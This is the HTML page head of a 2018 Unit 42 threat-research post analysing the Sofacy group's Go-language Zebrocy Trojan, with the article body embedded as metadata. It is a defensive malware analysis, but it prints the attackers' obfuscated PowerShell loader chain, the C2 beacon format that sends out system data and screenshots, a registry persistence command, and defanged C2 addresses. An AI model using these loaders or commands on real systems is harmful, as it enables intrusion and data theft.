
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>Sofacy Creates New ‘Go’ Variant of Zebrocy Tool</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/sofacy-creates-new-go-variant-of-zebrocy-tool/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="The Sofacy group continues to use variants of the Zebrocy payload in its attack campaigns."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/sofacy-creates-new-go-variant-of-zebrocy-tool/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Sofacy Creates New ‘Go’ Variant of Zebrocy Tool" />
<meta property="og:description" content="The Sofacy group continues to use variants of the Zebrocy payload in its attack campaigns." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/sofacy-creates-new-go-variant-of-zebrocy-tool/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="Sofacy" />
<meta property="article:tag" content="Zebrocy" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2018-12-18T04:00:42+00:00" />
<meta property="article:modified_time" content="2019-01-15T12:31:01+00:00" />
<meta property="og:updated_time" content="2019-01-15T12:31:01+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/unit42-blog-600x300.jpg" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/unit42-blog-600x300.jpg" />
<meta property="og:image:width" content="600" />
<meta property="og:image:height" content="300" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="The Sofacy group continues to use variants of the Zebrocy payload in its attack campaigns." />
<meta name="twitter:title" content="Sofacy Creates New ‘Go’ Variant of Zebrocy Tool" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/04/unit42-blog-600x300.jpg" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Sofacy Creates New ‘Go’ Variant of Zebrocy Tool Comments Feed" href="https://unit42.paloaltonetworks.com/sofacy-creates-new-go-variant-of-zebrocy-tool/feed/" />
<meta property="og:likes" content="4"/>
<meta property="og:readtime" content="10"/>
<meta property="og:views" content="30,301"/>
<meta property="og:date_created" content="December 18, 2018 at 6:00 AM"/>
<meta property="og:post_length" content="3382"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit-42/"/>
<meta property="og:author" content="Robert Falcone"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/robertfalcone/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:post_image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/zebrocy_go_crop-380x184.png"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Sofacy Creates New \u2018Go\u2019 Variant of Zebrocy Tool","name":"Sofacy Creates New \u2018Go\u2019 Variant of Zebrocy Tool","description":"The Sofacy group continues to use variants of the Zebrocy payload in its attack campaigns.","url":"https:\/\/unit42.paloaltonetworks.com\/sofacy-creates-new-go-variant-of-zebrocy-tool\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/sofacy-creates-new-go-variant-of-zebrocy-tool\/","datePublished":"December 18, 2018","articleBody":"The Sofacy threat group continues to carry out attacks using their Zebrocy tool. We first wrote about the Zebrocy tool in a blog that discussed Sofacy\u2019s parallel attack campaigns during the first quarter of 2018, and more recently during Sofacy attacks in late October and early November. The developers of Zebrocy have once again created a new version the Trojan using a different programming language, specifically the Go language. The use of a different programming language to create a functionally similar Trojan is not new to this group, as past Zebrocy variants have been developed in AutoIt, Delphi, VB.NET, C# and Visual C++. While we cannot be certain the impetus for this, we believe the threat group uses multiple languages to create their Trojans to make them differ structurally and visually to make detection more difficult.\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\nWe have seen two separate attacks deliver the Go variant of Zebrocy. The first attack occurred on October 11 and relied on a spear-phishing email with an LNK shortcut attachment. The LNK shortcut is meant to run a series of PowerShell scripts to extract a payload from the shortcut to install and execute; however, the PowerShell scripts were coded incorrectly and could not install or run the payload as delivered. Therefore, the first observed attack mentioned in this blog could not be successful, but the tactics, techniques and indicators are worth discussing for situational awareness. More recently, we have seen Sofacy delivering the Go variant of Zebrocy using a document related to the Dear Joohn attack campaign that occurred in mid-October through mid-November.\r\n\r\n&nbsp;\r\n\r\nThe First Attack\r\n\r\nThe attack occurred on October 11, 2018 and involved a spear-phishing email (T1193) discussing the effects of US sanctions on the Russian economy. The \u201cFrom\u201d address and the signature included the name of an individual at the targeted organization. The \u201cTo\u201d field in the delivery email was blank, which makes us believe that the targeted individuals were included in the \u201cBcc\u201d field of this email. Figure 1 shows the delivery email used in this attack.\r\n\r\n&nbsp;\r\n\r\n\r\nFigure 1 Delivery email used in Go Zebrocy attack\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\nThe Payload\r\n\r\nThe delivery document \u041f\u0440\u043e\u0442\u0438\u0432\u043e\u0434\u0435\u0438\u0306\u0441\u0442\u0432\u0438\u0435 \u0414\u0443\u043c\u044b \u0421\u0430\u043d\u043a\u0446\u0438\u044f\u043c \u0421\u0428\u0410.doc (SHA256:d77eb89501b0a60322bc69692007b9b7f1b5a85541a2aaf21caf7baf0fe0049e) attempts to masquerade as a Word document, however, the file is a shortcut LNK. When opened (T1204), the LNK file attempts to run the following command line in a visible command prompt (T1059):\r\npowershell.exe -nop -w 1 $i853=[TeXt.EnCoDING]::utF8.geTStrInG([conVErT]::frOmbaSE64stRing('JHAxLCRwMj0zNjU5LDY5MjQ3NjQ7JHBhdGhUb0xOSz0nQzUgcmVnaW9uYWwgY29uZmVyZW5jZSBhbmQgdHJhaW5pbmcgd29ya3Nob3Agb24gY29tbXVuaXR5IHBvbGljaW5nKDEpLmRvY3gubG5rJztpZigtbk9UKFRlU3QtcEF0SCAkcGF0aFRvTE5LKSl7JERpckQ9R2VULUNISUxkSVRFTSAtcEF0aCAkZW52OnRlbXAgLWZpTFRlciAkcGF0aFRvTE5LIC1yRWNVclNFO1tpTy5kaVJlY3RvUlldOjpzRVRDVXJyZW50RElyRWN0b1JZKCREaXJELmRJcmVDVE9SWU5BTWUpO30kRmlsZVN0cmVhbWE9bkV3LW9iakVDVCBpby5mSUxlU1RyZUFtICRwYXRoVG9MTkssJ09wZU4nLCdSZUFkJywncmVhRHdSSVRFJzskQXJyYXlNYXM9TkV3LW9iamVjVCBieVRFW10oJHAyKTskRmlsZVN0cmVhbWEuU0VlSygkcDEsW2lvLlNlRUtvUmlHaW5dOjpCRUdpbik7JEZpbGVTdHJlYW1hLnJFQUQoJEFycmF5TWFzLDAsJHAyKTskQXJyYXlNYXM9W0NvbnZlclRdOjpGck9tYmFzRTY0Q0hhckFyUkF5KCRBcnJheU1hcywwLCRBcnJheU1hcy5MZU5HVGgpOyRkdWFjYWp1QT1bdGV4VC5FbkNPZEluR106OlVuaWNvZGUuZ0VUc3RSSW5nKCRBcnJheU1hcyk7aWVYICRkdWFjYWp1QTs='));ieX $i853;\r\n&nbsp;\r\n\r\nThe shortcut uses PowerShell (T1086) to base64 decode (T1140) a second PowerShell script and executes it. The second PowerShell script decodes to the following:\r\n$p1,$p2=3659,6924764;$pathToLNK='C5 regional conference and training workshop on community policing(1).docx.lnk';if(-nOT(TeSt-pAtH $pathToLNK)){$DirD=GeT-CHILdITEM -pAth $env:temp -fiLTer $pathToLNK -rEcUrSE;[iO.diRectoRY]::sETCUrrentDIrEctoRY($DirD.dIreCTORYNAMe);}$FileStreama=nEw-objECT io.fILeSTreAm $pathToLNK,'OpeN','ReAd','reaDwRITE';$ArrayMas=NEw-objecT byTE[]($p2);$FileStreama.SEeK($p1,[io.SeEKoRiGin]::BEGin);$FileStreama.rEAD($ArrayMas,0,$p2);$ArrayMas=[ConverT]::FrOmbasE64CHarArRAy($ArrayMas,0,$ArrayMas.LeNGTh);$duacajuA=[texT.EnCOdInG]::Unicode.gETstRIng($ArrayMas);ieX $duacajuA;\r\n&nbsp;\r\n\r\nThe PowerShell script above attempts to extract another PowerShell script directly from the LNK shortcut file, which it would then execute. For unknown reasons, the actor that created this LNK shortcut included the incorrect filename for the LNK file, specifically C5 regional conference and training workshop on community policing(1).docx.lnk instead of the delivery document \u041f\u0440\u043e\u0442\u0438\u0432\u043e\u0434\u0435\u0438\u0306\u0441\u0442\u0432\u0438\u0435 \u0414\u0443\u043c\u044b \u0421\u0430\u043d\u043a\u0446\u0438\u044f\u043c \u0421\u0428\u0410.doc.\u00a0 The LNK shortcut filename does not match the filename delivered in the email, so this attack would never be successful as the PowerShell script above would be unable to obtain the payload to install on the system. The C5 regional conference and training workshop on community policing(1).docx.lnk filename included in this LNK file may be an artifact from a previous attack using the same delivery LNK and payload.\r\n\r\nHad the attackers included the correct filename to the LNK delivery in the script above, it would have located the PowerShell script in the LNK file by using a hardcoded offset of \"3659\", which it would have used to seek 3659 bytes into the LNK file. The script would then read a hardcoded number of bytes, specifically 6,924,764 bytes from this offset and executes it. The resulting PowerShell script obtained from within the LNK file has the following contents, of which we have trimmed some of the encoded data and replaced it with \"[..snip..]\" for brevity:\r\n$6vlJwyyB = @('C5 regional conference and training workshop on community policing(1).exe','C5 regional conference and training workshop on community policing(1).docx');$TcCd3Fej = \"C5 regional conference and training workshop on community policing(1).exe\";$Aq3NkyDG = @(\"TVqQAAMA[..snip..]\",\"UEsDBBQABgAIAA[..snip..]\");$ggdDQhlx = \"C5 regional conference and training workshop on community policing(1).docx\";FOR($I=0;$I -lt $6vLjwYYb.LengTH;$i++){[BYtE[]]$YGktk0Nk = [cOnveRt]::frOmBaSE64StriNg($aq3nkYDg[$I]);[syStEm.IO.fILE]::WrItEaLlbYtES($EnV:pUbLIc+\"\\\"+$6VLJwYYB[$I],$YGktK0nk);}$qsVmUm76 = $Env:public+\"\\\"+$tCcd3Fej;$GGdDQhLxPatH = $env:publIC+\"\\\"+$gGddQHLX;staRT-pROCess -wINDowstylE HIDdeN -FIlepAth $qsVMuM76;StART-ProceSs -FilepaTh $GgDdQHlxpATH;\r\n&nbsp;\r\n\r\nThis final PowerShell script is responsible for decoding an executable and Word document that it will write to the system in the %PUBLIC% folder with names C5 regional conference and training workshop on community policing(1).exe and C5 regional conference and training workshop on community policing(1).docx, respectively. The decoded content written to the Word document contains the decoy content seen in Figure 2 (SHA256:b6b2f6aae80cba3fa142bd216decc1f6db024a5ab46d9c21cf6e4c1ab0bbe58b), which in this specific case is an agenda for a conference that occurred between June 18 and 20, 2018 in Dushanbe, Tajikistan sponsored by Saferworld and the United States Institute of Peace.\r\n\r\n&nbsp;\r\n\r\n\r\nFigure 2 Decoy document opened during installation of Go Zebrocy\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\nThe decoded executable is the payload (SHA256: fcf03bf5ef4babce577dd13483391344e957fd2c855624c9f0573880b8cba62e) whose developer wrote in the Go Language, which appears to be a variant of the Zebrocy Trojan that we have previously analyzed. The use of another language to develop a similar Trojan in functionality to Zebrocy is fitting for this threat group, as we have previously seen this group create variants of Zebrocy in AutoIt, Delphi and C++. The similarities between this payload and previous Zebrocy variants include general high-level capabilities as well as some more specific overlaps. Like other Zebrocy samples, this Zebrocy variant written in Go does initial collection on the compromised system (T1119), exfiltrates this information to the C2 server and attempts to download, install and execute a payload from the C2. The Go variant also has some more specific overlaps in its functionality, including:\r\n\r\n&nbsp;\r\n\r\n \tThe use of ASCII hexadecimal obfuscation of strings\r\n \tThe use of the volume serial number without a hyphen obtained from the VOL command\r\n \tThe use of the output from \"systeminfo\" and \"tasklist\" in the outbound C2 beacon\r\n \tThe use of the string \"PrgStart\" within the C2 beacon\r\n\r\n&nbsp;\r\n\r\nThe most important overlap between the Go variant of Zebrocy and other variants is a shared C2 URL, specifically hxxp:\/\/89.37.226[.]148\/technet-support\/library\/online-service-description.php?id_name= that was also used by Zebrocy samples de31a8a9110b32a82843e9216a3378cc1c5ea972a6bb2261ec111efb82f31e71 and daf990f0b6564c3ac87fa87e325e6ffc907ed43ae65a3f088a42b5b120612593, which were both written in Delphi.\r\n\r\nThe Go variant of Zebrocy attempts to evade automated analysis by checking the executable filename of its process for the \u201c)\u201d character. If the filename does not contain a \u201c)\u201d character, the Trojan immediately exits without executing its functional code. The Trojan looks for this character specifically, because it expects to run as a file named C5 regional conference and training workshop on community policing(1).exe.\r\n\r\nThis Zebrocy variant uses HTTP POST requests to interact with its C2 server (T1071), which contains system specific information in the POST data section. The system specific information includes\r\n\r\n \tRunning processes via \u201ctasklist\u201d command (T1057).\r\n \tSystem information via the \u201dsysteminfo\u201d command (T1082).\r\n \tLocal disk information (T1120) via WMI by running the command \u201cwmic logicaldisk get caption,description,drivetype,providername,size\u201d (T1047).\r\n \tA screenshot of the desktop (T1113) that the GoZebrocy tool takes using an open source Go library.\r\n\r\nThe C2 communications between the Trojan and its C2 has the following structure:\r\n\r\n&nbsp;\r\n\r\nPOST \/technet-support\/library\/online-service-description.php?id_name=[serial number from VOL command with hyphen removed] HTTP\/1.1\r\n\r\nHost: 89.37.226[.]148\r\n\r\nUser-Agent: Go-http-client\/1.1\r\n\r\nContent-Length: 570690\r\n\r\nContent-Type: application\/x-www-form-urlencoded\r\n\r\nAccept-Encoding: gzip\r\n\r\n&nbsp;\r\n\r\nattach=PrgStart%3A[path to running Trojan]%0D%0A%5B[current time]%5D%0D%0A%0D%0A[results from wmic logicaldisk get caption,description,drivetype,providername,size]%0D%0D%0A%0D%0D%0A%0D%0A%0D%0A[results systeminfo command]%0D%0A%0D%0A%0D%0A[results tasklist command]%0D%0A&amp;support=[screenshot of system represented as ascii hexadecimal bytes]\r\n\r\n&nbsp;\r\n\r\nThe C2 server will respond to this HTTP POST request with ascii hexadecimal bytes that the payload will decode and save to the following file (T1105):\r\n\r\n&nbsp;\r\n\r\n%APPDATA%\\Identities\\{83AF1378-986F-1673-091A-02681FA62C3B}\\w32srv.exe\r\n\r\n&nbsp;\r\n\r\nThe payload will then execute this newly created file using the Golang \"os\/exec\" module, specifically using the \"Command\" and \"Run\" functions in the \"os\/exec\" module to run the following command line:\r\n\r\n&nbsp;\r\n\r\ncmd \/C %APPDATA%\\Identities\\{83AF1378-986F-1673-091A-02681FA62C3B}\\w32srv.exe\r\n\r\n&nbsp;\r\n\r\nDear Joohn Related Delivery\r\n\r\nThe second attack we observed delivering the Zebrocy variant written in the Go language is related to the Dear Joohn attacks that we have previously published. While the Dear Joohn campaign occurred in mid-October to mid-November 2018, the delivery document (SHA256: 346e5dc097b8653842b5b4acfad21e223b7fca976fb82b8c10d9fa4f3747dfa0) that ultimately installed the Go Zebrocy sample was created on December 3, 2018. This delivery document had an author name of Joohn, which is how we clustered the Dear Joohn delivery documents for that campaign.\r\n\r\nLike the Dear Joohn attacks, the delivery document downloads a remote template (SHA256: 07646dc0a8c8946bb78be9b96147d4327705c1a3c3bd3fbcedab32c43d914305) via HTTP (T1071) that has an author and last saved by xxx. Upon opening the delivery document, the lure image seen in Figure 3 attempts to trick the recipient into enabling content (T1204) to run the macro within the downloaded remote template.\r\n\r\n&nbsp;\r\nFigure 3 Lure image attempting to trick user into clicking the Enabling Content button\r\n&nbsp;\r\n\r\nThe delivery document is configured to obtain a remote template from hxxps:\/\/bit[.]ly\/2G8QrgL (T1102), as seen in the following from the document\u2019s word\/_rels\/settings.xml.rels file:\r\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;\r\n&lt;Relationships xmlns=\"http:\/\/schemas.openxmlformats.org\/package\/2006\/relationships\"&gt;&lt;Relationship Id=\"rId1\" Type=\"http:\/\/schemas.openxmlformats.org\/officeDocument\/2006\/relationships\/attachedTemplate\" Target=\"hxxps:\/\/bit[.]ly\/2G8QrgL\" TargetMode=\"External\"\/&gt;&lt;\/Relationships&gt;\r\n&nbsp;\r\n\r\nThe hxxps:\/\/bit[.]ly\/2G8QrgL shortened link redirects to the remote template hosted at a URL of hxxp:\/\/89.37.226[.]123\/Templates\/NormalOld.dotm. Previous Dear Joohn delivery documents did not use a shortened link to obtain its remote template, which suggests a shift in techniques used in this campaign. Fortunately for us, the shortened link provides some statistics on how many visitors accessed the link and their country of origin. When accessed on December 5, 2018, Figure 4 shows the statistics for the shortened link, showing the link was created on December 3, 2018 at 12:56 PM, which was visited 75 times from mostly from Turkey.\r\n\r\n&nbsp;\r\nFigure 4 Statistics on visitors to the shortened link used to point to remote template (Accessed December 5, 2018)\r\n&nbsp;\r\n\r\nThe remote template downloaded via this shortened link contains a macro similar to other Dear Joohn samples. The macro differs as it extracts a ZIP from the remote template file (SHA256: c817aab6e8dcaeaeae817a85ba209c0ca690be58b91e6cff0e3f0660336f9506) and saves it to a file named driver_pack.zip. The archive contains an executable named driver_pack.exe (SHA256: b48b3d46ebfa6af8a25c007f77e6ed3c32fe4c6478311b8b0c7d6f4f8c82de76), which is a WinRAR SFX executable archive that contains another executable named comsvc.exe. The WinRAR SFX archive extracts the comsvc.exe payload using the following SFX script:\r\n\r\n&nbsp;\r\n\r\nPath=%APPDATA%\\AppHistory\r\n\r\nSetup=comsvc.exe\r\n\r\nSilent=1\r\n\r\nOverwrite=2\r\n\r\n&nbsp;\r\n\r\nThe comsvc.exe executable (SHA256: 93680d34d798a22c618c96dec724517829ec3aad71215213a2dcb1eb190ff9fa) is a UPX packed variant of the Go Zebrocy malware (SHA256: 15a866c3c18046022a810aa97eaf2e20f942b8293b9cb6b4d5fb7746242c25b7), which is a downloader responsible for obtaining and executing secondary payloads from a C2 server.\r\n\r\nLike other Zebrocy variants, this Go Zebrocy malware checks the path of the running process to make sure it contains comsvc, as it would if executed by the delivery document that would eventually save the payload to comsvc.exe. If the Go Zebrocy sample was not run as comsvc.exe, it will send an HTTP POST request to google[.]com unlike other Zebrocy variants that will just exit, which we believe this is an attempt to further evade heuristic detection. Figure 5 shows the HTTP request sent to google[.]com.\r\n\r\n&nbsp;\r\n\r\nFigure 5 HTTP POST to google.com in the event Go Zebrocy executes with incorrect filename\r\n\r\n&nbsp;\r\n\r\nThe data sent in the HTTP POST request in Figure 5 decodes to &lt;#0&gt;0&lt;##0&gt;&lt;#1&gt;1&lt;##1&gt;&lt;#2&gt;1&lt;##2&gt;, which does not necessarily have any purpose other than filling the same HTTP POST data delimiters that Go Zebrocy will use when communicating with the C2. In the event that the sample was run as comsvc.exe, the Trojan will reach out to the following URL to communicate with its C2 server:\r\n\r\n&nbsp;\r\n\r\nhxxp:\/\/89.37.226[.]123\/advance\/portable_version\/service.php\r\n\r\n&nbsp;\r\n\r\nThe Go Zebrocy tool will get the volume serial number, take a screenshot of the system (T1113) and gather system specific information using a legitimate library called psutil that is available on Github. The Trojan will call the `Host Info` function from the psutil library that will effectively gather platform information (operating system, version etc.), the time the system was booted, the system uptime, the system\u2019s GUID, and process IDs for running processes (T1057). The Zebrocy variant will send an HTTP POST request (T1071) to the above URL with post data structured as follows:\r\n\r\n&nbsp;\r\n\r\nproject=%3C%230%3E4D291F48%3C%23%230%3E%3C%231%3E[serial number of storage volume]%3C%23%230%3E%3C%231%3E[gathered system information]%3C%23%231%3E%3C%232%3E[screenshot in JPEG format]%3C%23%232%3E\r\n\r\n&nbsp;\r\n\r\nThe hexadecimal characters in the HTTP POST data are used as delimiters, which represent the following:\r\n\r\n&nbsp;\r\n\r\n&lt;#0&gt;[serial number of storage volume]&lt;##0&gt;&lt;#1&gt;[gathered system information]&lt;##1&gt;&lt;#2&gt;[screenshot in JPEG format]&lt;##2&gt;\r\n\r\n&nbsp;\r\n\r\nThe C2 will respond to the above request with a hexadecimal encoded payload that the Trojan will save to the system and execute. The Trojan writes the secondary payload to the following file:\r\n\r\n&nbsp;\r\n\r\n%LOCALAPPDATA%\\Microsoft\\Feeds\\{5588ACFD-6436-411B-A5CE-666AE6A92D3D}~\\wcncsvc.exe\r\n\r\n&nbsp;\r\n\r\nBefore executing the dropped file, the Trojan will create an auto run registry key (T1060) to have the secondary payload run each time the user logs in using the following command line (T1059):\r\n\r\n&nbsp;\r\n\r\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \/v Media Center Extender Service\r\n\r\n&nbsp;\r\n\r\nDuring our analysis, the secondary payload downloaded from the C2 is another Trojan written in Go language (SHA256: 50d610226aa646dd643fab350b48219626918305aaa86f9dbd356c78a19204cc), which the actors packed with UPX (SHA256: ee9218a451c455fbca45460c0a27e1881833bd2a05325ed60f30bd4d14bb2fdc) (T1045). This secondary payload is another downloader that uses HTTPS instead of HTTP for its C2 communications. This secondary payload communicates with the following URL as its C2:\r\n\r\n&nbsp;\r\n\r\nhxxps:\/\/190.97.167[.]186\/pkg\/image\/do.php\r\n\r\n&nbsp;\r\n\r\nThe HTTP POST request sent via HTTPS will look as follows, specifically including the first four bytes of the volume serial number and the first four characters of the hostname within the post data in a field labeled \"l\" as seen in Figure 6.\r\n\r\n&nbsp;\r\n\r\nFigure 6 HTTP beacon sent by the secondary payload within its HTTPS C2 channel\r\n\r\n&nbsp;\r\n\r\nConclusion\r\n\r\nThe Sofacy group continues to use variants of the Zebrocy payload in its attack campaigns. Developers of Zebrocy continue to create new variants of the Trojan using different coding languages, which in this particular case used the Go language. The adversaries made some drastic errors to the delivery LNK shortcut, which made this attack seemingly ineffective. Regardless of the attack\u2019s effectiveness, the techniques and indicators we observed still provide analytical points for correlation and should be included in an organizations security defenses as the group may use the payload and infrastructure in future attacks. It is also apparent that the Sofacy group will use these new variants of Zebrocy across multiple different campaigns, as the Go variant of Zebrocy was delivered via the LNK shortcut and a Dear Joohn delivery document.\r\n\r\nPalo Alto customers can protect themselves against this threat by:\r\n\r\n \tUsing a file blocking profile on our next-gen firewall to block LNK shortcuts sent via email. Please reference the following knowledge base article for more information on how to configure this capability: https:\/\/knowledgebase.paloaltonetworks.com\/KCSArticleDetail?id=kA10g000000ClT8CAK\r\n \tThreat Prevention customers are protected by the Gen Command And Control Traffic\r\n \tAutoFocus customers can track this Zebrocy variant via the Zebrocy\r\n\r\n&nbsp;\r\n\r\nIndicators of Compromise\r\n\r\n&nbsp;\r\n\r\nZebrocy Go variant\r\n\r\nfcf03bf5ef4babce577dd13483391344e957fd2c855624c9f0573880b8cba62e\r\n\r\n93680d34d798a22c618c96dec724517829ec3aad71215213a2dcb1eb190ff9fa\r\n\r\n&nbsp;\r\n\r\nZebrocy Go C2\r\n\r\nhxxp:\/\/89.37.226[.]148\/technet-support\/library\/online-service-description.php\r\n\r\n89.37.226[.]148\r\n\r\nhxxp:\/\/89.37.226[.]123\/advance\/portable_version\/service.php\r\n\r\n89.37.226[.]123\r\n\r\n&nbsp;\r\n\r\nRelated Zebrocy Samples\r\n\r\nde31a8a9110b32a82843e9216a3378cc1c5ea972a6bb2261ec111efb82f31e71\r\n\r\ndaf990f0b6564c3ac87fa87e325e6ffc907ed43ae65a3f088a42b5b120612593\r\n\r\n308b41db9e3b332bb5b3e5ec633907761eac5082029b8b32e6b063b8c76b7365\r\n\r\nf93b89a707c647ba492efe4515bb69a627ce14f35926ee4147e13d2e030ab55b\r\n\r\n1ff4e56419ad1814726ca143fc256cca4c8588605536c48dd79cfed12cb0763a\r\n\r\n&nbsp;\r\n\r\nDear Joohn Related Hashes\r\n\r\n346e5dc097b8653842b5b4acfad21e223b7fca976fb82b8c10d9fa4f3747dfa0 - Delivery Document\r\n\r\n07646dc0a8c8946bb78be9b96147d4327705c1a3c3bd3fbcedab32c43d914305 - Remote Template\r\n\r\nc817aab6e8dcaeaeae817a85ba209c0ca690be58b91e6cff0e3f0660336f9506 - ZIP in Remote Template\r\n\r\nb48b3d46ebfa6af8a25c007f77e6ed3c32fe4c6478311b8b0c7d6f4f8c82de76 - WinRAR SFX in ZIP\r\n\r\n93680d34d798a22c618c96dec724517829ec3aad71215213a2dcb1eb190ff9fa - Go Zebrocy sample\r\n\r\n50d610226aa646dd643fab350b48219626918305aaa86f9dbd356c78a19204cc - Secondary payload\r\n\r\n&nbsp;\r\n\r\nDear Joohn Related URLs\r\n\r\nhxxps:\/\/bit[.]ly\/2G8QrgL - Remote Template Shortened Link\r\n\r\nhxxp:\/\/89.37.226[.]123\/Templates\/NormalOld.dotm - Remote Template URL\r\n\r\nhxxp:\/\/89.37.226[.]123\/advance\/portable_version\/service.php - Go Zebrocy HTTP C2\r\n\r\nhxxps:\/\/190.97.167[.]186\/pkg\/image\/do.php - Secondary payload HTTPS C2\r\n\r\n&nbsp;\r\n\r\nSecondary Payload Hash\r\n\r\n50d610226aa646dd643fab350b48219626918305aaa86f9dbd356c78a19204cc\r\n\r\n&nbsp;\r\n\r\nSecondary Payload C2\r\n\r\nhxxps:\/\/190.97.167[.]186\/pkg\/image\/do.php\r\n\r\n190.97.167[.]186\r\n\r\n&nbsp;\r\n\r\nATT&amp;CK Techniques Observed\r\n\r\n\r\n\r\nID\r\nTechnique\r\n\r\n\r\nT1193\r\nSpearphishing Attachment\r\n\r\n\r\nT1059\r\nCommand-Line Interface\r\n\r\n\r\nT1086\r\nPowerShell\r\n\r\n\r\nT1140\r\nDeobfuscate\/Decode Files or Information\r\n\r\n\r\nT1119\r\nAutomated Collection\r\n\r\n\r\nT1071\r\nStandard Application Layer Protocol\r\n\r\n\r\nT1057\r\nProcess Discovery\r\n\r\n\r\nT1082\r\nSystem Information Discovery\r\n\r\n\r\nT1120\r\nPeripheral Device Discovery\r\n\r\n\r\nT1047\r\nWindows Management Instrumentation\r\n\r\n\r\nT1113\r\nScreen Capture\r\n\r\n\r\nT1105\r\nRemote File Copy\r\n\r\n\r\nT1102\r\nWeb Service\r\n\r\n\r\nT1204\r\nUser Execution\r\n\r\n\r\nT1060\r\nRegistry Run Keys \/ Startup Folder\r\n\r\n\r\nT1045\r\nSoftware Packing\r\n\r\n\r\n\r\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2018\/04\/unit42-blog-600x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Robert Falcone"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
